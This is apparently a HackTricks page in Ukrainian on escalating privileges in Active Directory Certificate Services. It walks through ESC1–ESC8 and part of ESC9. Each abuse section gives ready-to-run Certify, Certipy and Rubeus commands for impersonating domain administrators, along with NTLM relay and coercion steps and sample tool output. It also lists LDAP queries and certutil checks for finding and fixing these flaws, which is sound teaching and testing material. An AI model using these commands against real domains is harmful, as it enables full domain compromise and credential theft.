# Ескалація домену AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Це короткий огляд розділів про техніки ескалації з таких публікацій:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Неправильно налаштовані шаблони сертифікатів - ESC1

### Пояснення

### Пояснення неправильно налаштованих шаблонів сертифікатів - ESC1

- **Enterprise CA надає права на реєстрацію сертифікатів користувачам із низьким рівнем привілеїв.**
- **Підтвердження керівника не вимагається.**
- **Підписи уповноважених осіб не потрібні.**
- **Дескриптори безпеки шаблонів сертифікатів мають надто широкі дозволи, що дає змогу користувачам із низьким рівнем привілеїв отримувати права на реєстрацію.**
- **Шаблони сертифікатів налаштовані так, щоб визначати EKU, які спрощують автентифікацію:**
- До них належать ідентифікатори Extended Key Usage (EKU), як-от Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) або відсутність EKU (SubCA).
- **Шаблон дозволяє запитувачам додавати subjectAltName до Certificate Signing Request (CSR):**
- Active Directory (AD) надає пріоритет subjectAltName (SAN) у сертифікаті під час перевірки особи, якщо він присутній. Це означає, що, вказавши SAN у CSR, можна запросити сертифікат для видавання себе за будь-якого користувача (наприклад, адміністратора домену). Чи може запитувач указати SAN, визначається в об'єкті AD шаблону сертифіката через властивість `mspki-certificate-name-flag`. Ця властивість є бітовою маскою, і наявність прапора `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє запитувачу вказувати SAN.

> [!CAUTION]
> Описана конфігурація дозволяє користувачам із низьким рівнем привілеїв запитувати сертифікати з будь-яким SAN на власний вибір, що дає змогу автентифікуватися як будь-який принципал домену через Kerberos або SChannel.

Цю функцію іноді вмикають для підтримки динамічного створення HTTPS- або host-сертифікатів продуктами чи службами розгортання або через нерозуміння її наслідків.

Зазначається, що створення сертифіката з цією опцією викликає попередження. Однак цього не відбувається, коли наявний шаблон сертифіката (наприклад, шаблон `WebServer`, у якому ввімкнено `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) дублюють, а потім змінюють, додаючи OID для автентифікації.<sup>[[6]](#references)</sup>

### Зловживання

Щоб **знайти вразливі шаблони сертифікатів**, можна виконати:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Щоб **зловжити цією вразливістю та видати себе за адміністратора**, можна виконати:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Потім ви можете перетворити згенерований **сертифікат у формат `.pfx`** і знову використати його для **автентифікації за допомогою Rubeus або certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Бінарні файли Windows «Certreq.exe» і «Certutil.exe» можна використати для створення PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Перерахування шаблонів сертифікатів у схемі конфігурації лісу AD, зокрема тих, що не потребують схвалення або підписів, мають EKU Client Authentication або Smart Card Logon і для яких увімкнено прапорець `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, можна виконати за допомогою такого LDAP-запиту:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Неправильно налаштовані шаблони сертифікатів - ESC2

### Пояснення

Другий сценарій abuse є варіацією першого:

1. Enterprise CA надає низькопривілейованим користувачам права на enrollment.
2. Вимогу щодо схвалення менеджером вимкнено.
3. Необхідність авторизованих підписів не передбачено.
4. Надто permissive дескриптор безпеки шаблону сертифіката надає низькопривілейованим користувачам права на enrollment сертифікатів.
5. **Шаблон сертифіката визначено так, щоб він містив Any Purpose EKU або не містив EKU.**

**Any Purpose EKU** дає змогу attacker отримати сертифікат для **будь-якої мети**, зокрема для client authentication, server authentication, code signing тощо. Для exploitation цього сценарію можна застосувати ту саму **technique, що й для ESC3**.

Сертифікати **без EKU**, які функціонують як subordinate CA certificates, можна використати для **будь-якої мети**, а **також для підписання нових сертифікатів**. Отже, attacker може вказати довільні EKU або поля в нових сертифікатах, використовуючи subordinate CA certificate.

Однак нові сертифікати, створені для **domain authentication**, не працюватимуть, якщо subordinate CA не є trusted об'єктом **`NTAuthCertificates`**, що є налаштуванням за замовчуванням. Попри це, attacker усе ще може створювати **нові сертифікати з будь-яким EKU** та довільними значеннями сертифіката. Потенційно їх можна **abuse** для широкого спектра цілей (наприклад, code signing, server authentication тощо), і це може мати значні наслідки для інших застосунків у мережі, таких як SAML, AD FS або IPSec.<sup>[[6]](#references)</sup>

Щоб перерахувати шаблони, які відповідають цьому сценарію в configuration schema AD Forest, можна виконати такий LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Неправильно налаштовані шаблони Enrollment Agent - ESC3

### Пояснення

Цей сценарій подібний до першого та другого, але **зловживає** **іншим EKU** (Certificate Request Agent) і **2 різними шаблонами** (тому має 2 набори вимог),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), відомий у документації Microsoft як **Enrollment Agent**, дає principal можливість **отримати** **сертифікат** **від імені іншого користувача**.

**“Enrollment agent”** отримує такий **сертифікат** за **шаблоном** і використовує отриманий **сертифікат для спільного підпису CSR від імені іншого користувача**. Потім він **надсилає** **спільно підписаний CSR** до CA, отримуючи сертифікат за **шаблоном**, який **дозволяє “enroll on behalf of”**, а CA відповідає **сертифікатом, що належить “іншому” користувачу**.<sup>[[6]](#references)</sup>

**Вимоги 1:**

- Enterprise CA надає low-privileged users права на отримання сертифікатів.
- Вимогу щодо схвалення менеджером не встановлено.
- Вимога щодо authorized signatures відсутня.
- Security descriptor шаблону сертифіката є надмірно permissive і надає low-privileged users права на отримання сертифікатів.
- Шаблон сертифіката містить Certificate Request Agent EKU, що дає змогу запитувати інші шаблони сертифікатів від імені інших principals.

**Вимоги 2:**

- Enterprise CA надає low-privileged users права на отримання сертифікатів.
- Схвалення менеджером обходиться.
- Версія схеми шаблону дорівнює 1 або перевищує 2, а також у ньому вказано Application Policy Issuance Requirement, який вимагає Certificate Request Agent EKU.
- EKU, визначений у шаблоні сертифіката, дозволяє domain authentication.
- На CA не застосовуються обмеження для enrollment agents.

### Зловживання

Для зловживання цим сценарієм можна використати [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy):<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Користувачі**, яким дозволено **отримувати** **сертифікат enrollment agent**, шаблони, у яких дозволено виконувати enrollment **агентам**, і **облікові записи**, від імені яких може діяти enrollment agent, можуть бути обмежені enterprise CA. Це робиться шляхом відкриття **snap-in** `certsrc.msc`, **клацання правою кнопкою миші на CA**, **натискання Properties**, а потім **переходу** на вкладку “Enrollment Agents”.

Однак зазначається, що **типовим** налаштуванням для CA є “**Do not restrict enrollment agents**.” Коли адміністратори вмикають обмеження для enrollment agents, встановлюючи параметр “Restrict enrollment agents”, типова конфігурація все одно залишається надзвичайно permissive. Вона дозволяє **Everyone** виконувати enrollment у всіх шаблонах від імені будь-кого.

## Vulnerable Certificate Template Access Control - ESC4

### **Пояснення**

**Дескриптор безпеки** на **шаблонах сертифікатів** визначає **дозволи**, якими володіють конкретні **AD principals** щодо шаблону.

Якщо **атакер** має необхідні **дозволи**, щоб **змінити** **шаблон** і **впровадити** будь-які **exploitable misconfigurations**, описані в **попередніх розділах**, це може сприяти privilege escalation.

Помітні дозволи, що застосовуються до шаблонів сертифікатів:<sup>[[6]](#references)</sup>

- **Owner:** Надає implicit control над об'єктом, дозволяючи змінювати будь-які атрибути.
- **FullControl:** Надає повний контроль над об'єктом, зокрема можливість змінювати будь-які атрибути.
- **WriteOwner:** Дозволяє змінити власника об'єкта на principal під контролем атакера.
- **WriteDacl:** Дозволяє змінювати access controls, потенційно надаючи атакеру FullControl.
- **WriteProperty:** Дозволяє редагувати будь-які властивості об'єкта.

### Abuse

Щоб ідентифікувати principals із правами редагування шаблонів та інших PKI-об'єктів, виконайте enumeration за допомогою Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Приклад privesc, подібного до попереднього:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 — це коли користувач має права на запис для шаблону сертифіката. Наприклад, цим можна зловживати, перезаписавши конфігурацію шаблону сертифіката, щоб зробити шаблон вразливим до ESC1.

Як видно з наведеної вище схеми, лише `JOHNPC` має ці привілеї, але наш користувач `JOHN` отримав новий зв’язок `AddKeyCredentialLink` із `JOHNPC`. Оскільки ця техніка пов’язана із сертифікатами, я також реалізував цю атаку, відому як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ось короткий приклад використання команди `shadow auto` у Certipy для отримання NT-хеша жертви.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** може перезаписати конфігурацію шаблону сертифіката однією командою. За **замовчуванням**, Certipy **перезапише** конфігурацію, щоб зробити її **вразливою до ESC1**. Також можна вказати **параметр `-save-old`, щоб зберегти стару конфігурацію**, що буде корисно для **відновлення** конфігурації після нашої атаки.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Контроль доступу до вразливих об’єктів PKI - ESC5

### Пояснення

Розгалужена мережа взаємопов’язаних відносин на основі ACL, яка охоплює кілька об’єктів, окрім шаблонів сертифікатів і центру сертифікації, може впливати на безпеку всієї системи AD CS. До цих об’єктів, які можуть суттєво впливати на безпеку, належать:

- Об’єкт комп’ютера AD сервера CA, який може бути скомпрометований за допомогою таких механізмів, як S4U2Self або S4U2Proxy.
- RPC/DCOM сервер сервера CA.
- Будь-який дочірній об’єкт AD або контейнер у межах визначеного шляху контейнера `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях включає, зокрема, такі контейнери й об’єкти, як контейнер Certificate Templates, контейнер Certification Authorities, об’єкт NTAuthCertificates і контейнер Enrollment Services.

Безпека системи PKI може бути скомпрометована, якщо attacker із низькими привілеями зможе отримати контроль над будь-яким із цих критичних компонентів.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Пояснення

Тема, розглянута в [**публікації CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), також стосується наслідків використання прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, описаних Microsoft. Ця конфігурація, якщо її активовано на Certification Authority (CA), дозволяє додавати **визначені користувачем значення** до **subject alternative name** для **будь-якого запиту**, зокрема створеного на основі Active Directory®. У результаті ця можливість дає **зловмиснику** змогу виконати enrollment через **будь-який шаблон**, налаштований для **автентифікації** домену, зокрема через ті, що доступні для enrollment **непривілейованим** користувачам, як-от стандартний шаблон User. У результаті можна отримати сертифікат, який дасть змогу зловмиснику автентифікуватися як адміністратор домену або **будь-яка інша активна сутність** у домені.<sup>[[9]](#references)</sup>

**Примітка**: спосіб додавання **альтернативних імен** до Certificate Signing Request (CSR) за допомогою аргументу `-attrib "SAN:"` у `certreq.exe` (який називається “Name Value Pairs”) **відрізняється** від стратегії експлуатації SAN в ESC1. Різниця полягає в тому, **як інкапсулюється інформація про обліковий запис**: у цьому випадку вона міститься в атрибуті сертифіката, а не в розширенні.

### Експлуатація

Щоб перевірити, чи активовано це налаштування, організації можуть скористатися наведеною нижче командою `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ця операція по суті використовує **віддалений доступ до реєстру**, тому альтернативним підходом може бути:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Такі інструменти, як [**Certify**](https://github.com/GhostPack/Certify) і [**Certipy**](https://github.com/ly4k/Certipy), здатні виявляти цю неправильну конфігурацію та експлуатувати її:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Щоб змінити ці налаштування, за умови наявності **адміністративних прав у домені** або еквівалентних прав, наведену нижче команду можна виконати з будь-якої робочої станції:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Щоб вимкнути цю конфігурацію у вашому середовищі, прапорець можна видалити за допомогою:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Після випуску оновлень безпеки у травні 2022 року нові **сертифікати** міститимуть **розширення безпеки**, яке включає властивість **`objectSid` запитувача**. Для ESC1 цей SID отримується із зазначеного SAN. Однак для **ESC6** SID відповідає **`objectSid` запитувача**, а не SAN.\
> Для exploitation ESC6 необхідно, щоб система була вразливою до ESC10 (Weak Certificate Mappings), який надає пріоритет **SAN над новим розширенням безпеки**.

## Керування доступом до вразливого Certificate Authority - ESC7

### Атака 1

#### Пояснення

Керування доступом до certificate authority здійснюється за допомогою набору дозволів, які регулюють дії CA. Ці дозволи можна переглянути, відкривши `certsrv.msc`, клацнувши правою кнопкою миші потрібний CA, вибравши властивості та перейшовши на вкладку Security. Крім того, дозволи можна перелічити за допомогою модуля PSPKI, використовуючи такі команди:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Це дає уявлення про основні права, а саме **`ManageCA`** і **`ManageCertificates`**, що відповідають ролям «адміністратор CA» і «менеджер сертифікатів» відповідно.<sup>[[6]](#references)</sup>

#### Зловживання

Наявність прав **`ManageCA`** на центр сертифікації дає змогу суб’єкту віддалено змінювати налаштування за допомогою PSPKI. Це включає активацію прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, щоб дозволити вказувати SAN у будь-якому шаблоні, що є критично важливим аспектом domain escalation.

Спрощення цього процесу можливе за допомогою cmdlet **Enable-PolicyModuleFlag** у PSPKI, який дає змогу вносити зміни без безпосередньої взаємодії з GUI.

Наявність прав **`ManageCertificates`** дає змогу схвалювати запити, що очікують на розгляд, фактично обходячи захисний механізм «схвалення менеджером сертифікатів CA».

Комбінацію модулів **Certify** і **PSPKI** можна використати для запиту, схвалення та завантаження сертифіката:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Атака 2

#### Пояснення

> [!WARNING]
> У **попередній атаці** дозволи **`Manage CA`** використовувалися для **увімкнення** прапорця **EDITF_ATTRIBUTESUBJECTALTNAME2** для виконання **атаки ESC6**, але це не матиме жодного ефекту, доки службу CA (`CertSvc`) не буде перезапущено. Коли користувач має право доступу **`Manage CA`**, йому також дозволено **перезапускати службу**. Однак це **не означає, що користувач може віддалено перезапустити службу**. Крім того, **ESC6 може не працювати одразу** у більшості середовищ, де встановлено виправлення, через оновлення системи безпеки від травня 2022 року.

Тому тут представлено іншу атаку.

Передумови:

- Лише дозвіл **`ManageCA`**
- Дозвіл **`Manage Certificates`** (можна надати з **`ManageCA`**)
- Шаблон сертифіката **`SubCA`** має бути **увімкнений** (можна увімкнути з **`ManageCA`**)

Техніка ґрунтується на тому, що користувачі з правами доступу `Manage CA` _і_ `Manage Certificates` можуть **видавати невдалі запити на сертифікати**. Шаблон сертифіката **`SubCA`** є **вразливим до ESC1**, але лише **адміністратори** можуть реєструватися в цьому шаблоні. Отже, **користувач** може **запросити** реєстрацію в **`SubCA`** — запит буде **відхилено**, — але **згодом його видасть менеджер**.<sup>[[6]](#references)</sup>

#### Зловживання

Ви можете **надати собі** право доступу **`Manage Certificates`**, додавши свого користувача як нового офіцера.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Шаблон **`SubCA`** можна **увімкнути на CA** за допомогою параметра `-enable-template`. За замовчуванням шаблон `SubCA` увімкнено.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Якщо ми виконали всі передумови для цієї атаки, можемо почати з **запиту сертифіката на основі шаблону `SubCA`**.

**Цей запит буде відхилено**, але ми збережемо приватний ключ і занотуємо ідентифікатор запиту.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Маючи **`Manage CA` і `Manage Certificates`**, ми можемо видати **відхилений запит на сертифікат** за допомогою команди `ca` і параметра `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
І нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` і параметра `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Атака 3 – Зловживання розширенням Manage Certificates (SetExtension)

#### Пояснення

На додаток до класичних зловживань ESC7 (увімкнення атрибутів EDITF або схвалення запитів, що очікують), **Certify 2.0** розкрив абсолютно новий примітив, для якого потрібна лише роль *Manage Certificates* (також відома як **Certificate Manager / Officer**) на Enterprise CA.<sup>[[3]](#references)</sup>

Метод RPC `ICertAdmin::SetExtension` може виконувати будь-який principal, який має *Manage Certificates*. Традиційно цей метод використовувався легітимними CA для оновлення розширень у **pending**-запитах, але attacker може зловживати ним, щоб **додати *не типове* розширення сертифіката** (наприклад, власний OID *Certificate Issuance Policy*, такий як `1.1.1.1`) до запиту, що очікує схвалення.

Оскільки цільовий template **не визначає типове значення для цього розширення**, CA НЕ перезапише контрольоване attacker значення, коли запит зрештою буде видано. Отже, отриманий сертифікат міститиме обране attacker розширення, яке може:

* Відповідати вимогам Application / Issuance Policy інших вразливих templates (що призводить до privilege escalation).
* Додати EKU або policy, які надають сертифікату неочікуваний рівень довіри в сторонніх системах.

Коротко кажучи, *Manage Certificates* — раніше вважалася «менш потужною» половиною ESC7 — тепер може використовуватися для повного privilege escalation або довготривалої persistence без зміни конфігурації CA чи отримання більш обмеженого права *Manage CA*.

#### Зловживання примітивом за допомогою Certify 2.0

1. **Надішліть certificate request, який залишиться *pending*.** Це можна зробити за допомогою template, що вимагає схвалення manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Додайте власне розширення до pending request**, використовуючи нову команду `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Якщо template ще не визначає розширення *Certificate Issuance Policies*, наведене значення буде збережено після видачі.*

3. **Видайте request** (якщо ваша роль також має права схвалення *Manage Certificates*) або дочекайтеся, поки operator схвалить його. Після видачі завантажте сертифікат:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Отриманий сертифікат тепер містить шкідливий issuance-policy OID і може використовуватися в подальших атаках (наприклад, ESC13, domain escalation тощо).

> ПРИМІТКА: Цю саму атаку можна виконати за допомогою Certipy ≥ 4.7 через команду `ca` та параметр `-set-extension`.

## NTLM Relay до HTTP Endpoints AD CS – ESC8

### Пояснення

> [!TIP]
> У середовищах, де **встановлено AD CS**, якщо існує **вразливий web enrollment endpoint** і опубліковано принаймні один **certificate template**, який дозволяє domain computer enrollment і client authentication (наприклад, типовий **`Machine`** template), **будь-який computer з активною spooler service може бути скомпрометований attacker**!

AD CS підтримує кілька **HTTP-based enrollment methods**, доступних через додаткові server roles, які можуть встановлювати administrators. Ці інтерфейси для HTTP-based certificate enrollment вразливі до **NTLM relay атак**. Attacker зі **скомпрометованої machine може видати себе за будь-який AD account, який authenticates через inbound NTLM**. Видаючи себе за victim account, attacker може отримати доступ до цих web interfaces і **запросити client authentication certificate за допомогою `User` або `Machine` certificate templates**.

- **Web enrollment interface** (старий ASP application, доступний за адресою `http://<caserver>/certsrv/`) за замовчуванням використовує лише HTTP, що не забезпечує захисту від NTLM relay атак. Крім того, він явно дозволяє лише NTLM authentication через свій Authorization HTTP header, що робить безпечніші методи authentication, як-от Kerberos, непридатними.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service і **Network Device Enrollment Service** (NDES) за замовчуванням підтримують negotiate authentication через свій Authorization HTTP header. Negotiate authentication **підтримує і** Kerberos, **і** **NTLM**, що дозволяє attacker **знизити рівень authentication до NTLM** під час relay атак. Хоча ці web services за замовчуванням активують HTTPS, самого HTTPS **недостатньо для захисту від NTLM relay атак**. Захист HTTPS services від NTLM relay атак можливий лише тоді, коли HTTPS поєднано з channel binding. На жаль, AD CS не активує Extended Protection for Authentication в IIS, що необхідно для channel binding.<sup>[[6]](#references)</sup>

Поширеною **проблемою** NTLM relay атак є **коротка тривалість NTLM sessions** і неможливість attacker взаємодіяти із services, які **вимагають NTLM signing**.

Однак це обмеження можна подолати, використавши NTLM relay атаку для отримання сертифіката для user, оскільки саме термін дії сертифіката визначає тривалість session, а сертифікат можна використовувати із services, які **вимагають NTLM signing**. Інструкції щодо використання викраденого сертифіката наведено тут:


{{#ref}}
account-persistence.md
{{#endref}}

Іншим обмеженням NTLM relay атак є те, що **machine, контрольована attacker, має бути authenticated victim account**. Attacker може або чекати, або спробувати **примусити** цю authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Зловживання**

[**Certify**](https://github.com/GhostPack/Certify) за допомогою `cas` перелічує **активні HTTP endpoints AD CS**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Властивість `msPKI-Enrollment-Servers` використовується корпоративними центрами сертифікації (CA) для зберігання кінцевих точок Certificate Enrollment Service (CES). Ці кінцеві точки можна проаналізувати та перелічити за допомогою інструмента **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Зловживання за допомогою Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Зловживання з [Certipy](https://github.com/ly4k/Certipy)

Certipy за замовчуванням надсилає запит на сертифікат на основі шаблону `Machine` або `User`, що визначається тим, чи закінчується ім’я облікового запису, автентифікацію якого ретранслюють, на `$`. Вказати альтернативний шаблон можна за допомогою параметра `-template`.

Після цього для примусового ініціювання автентифікації можна застосувати техніку на кшталт [PetitPotam](https://github.com/ly4k/PetitPotam). Під час роботи з контролерами домену потрібно вказати `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Відсутнє розширення безпеки - ESC9 <a href="#id-5485" id="id-5485"></a>

### Пояснення

Нове значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, відоме як ESC9, забороняє вбудовування **нового розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`** у сертифікат. Цей прапорець стає важливим, коли `StrongCertificateBindingEnforcement` має значення `1` (налаштування за замовчуванням), на відміну від значення `2`. Його важливість зростає у сценаріях, де може бути використане слабше зіставлення сертифіката для Kerberos або Schannel (як у ESC10), оскільки відсутність ESC9 не змінювала б вимог.<sup>[[7]](#references)</sup>

Умови, за яких встановлення цього прапорця стає важливим:

- `StrongCertificateBindingEnforcement` не змінено на `2` (значення за замовчуванням — `1`), або `CertificateMappingMethods` містить прапорець `UPN`.
- Сертифікат позначено прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у налаштуванні `msPKI-Enrollment-Flag`.
- У сертифікаті вказано будь-який EKU для автентифікації клієнта.
- Наявні дозволи `GenericWrite` для будь-якого облікового запису, щоб скомпрометувати інший.

### Сценарій зловживання

Припустімо, що `John@corp.local` має дозволи `GenericWrite` щодо `Jane@corp.local` і прагне скомпрометувати `Administrator@corp.local`. Шаблон сертифіката `ESC9`, у якому `Jane@corp.local` має право виконувати enrollment, налаштовано з прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у його налаштуванні `msPKI-Enrollment-Flag`.

